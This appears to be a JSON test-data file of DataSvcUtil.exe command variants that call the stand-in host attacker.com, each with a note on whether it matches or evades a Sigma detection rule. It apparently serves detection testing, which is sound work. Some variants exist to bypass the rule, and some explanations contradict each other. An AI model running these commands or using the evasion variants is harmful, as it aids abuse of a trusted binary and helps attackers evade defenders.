@@ -1,0 +1,22 @@
+[
+  {
+    "output": "DataSvcUtil.exe /uri:http://attacker.com /out:C:\\Windows\\Temp\\proxy.cs /in:C:\\Windows\\Temp\\input.cs",
+    "explanation": "This command uses standard syntax and parameters from the Sigma rule. It includes the required /uri, /out, and /in flags, which are flagged by the rule. This is a direct representation of the malicious behavior described in the rule."
+  },
+  {
+    "output": "DataSvcUtil.exe -uri http://attacker.com -out C:\\Windows\\Temp\\proxy.cs -in C:\\Windows\\Temp\\input.cs",
+    "explanation": "This command substitutes the long-form syntax (e.g., /uri) with the short-form syntax (-uri), which is an equivalent parameter representation. The Sigma rule is based on the presence of specific command-line arguments, so this substitution still matches the rule."
+  },
+  {
+    "output": "DataSvcUtil.exe /uri:http://attacker.com /out:C:\\Windows\\Temp\\proxy.cs in:C:\\Windows\\Temp\\input.cs",
+    "explanation": "This command omits the leading '/' from the /in parameter, which may be accepted by the program as a valid argument. The Sigma rule detects the presence of the string '/in:' in the command line, so this omission may bypass the rule if the program still accepts the argument without the '/' prefix."
+  },
+  {
+    "output": "DataSvcUtil.exe /uri:http://attacker.com out:C:\\Windows\\Temp\\proxy.cs in:C:\\Windows\\Temp\\input.cs",
+    "explanation": "This command omits both the '/' from /out and /in, replacing them with just 'out:' and 'in:'. If the program accepts these as valid parameter syntax, this could bypass the Sigma rule, which is looking for the exact '/out:' and '/in:' strings."
+  },
+  {
+    "output": "DataSvcUtil.exe\" /uri:http://attacker.com /out:C:\\Windows\\Temp\\proxy.cs /in:C:\\Windows\\Temp\\input.cs",
+    "explanation": "This command adds a trailing quote after the executable name, which may still be parsed correctly. This is a safe insertion technique and does not affect the detection logic of the Sigma rule."
+  }
+]
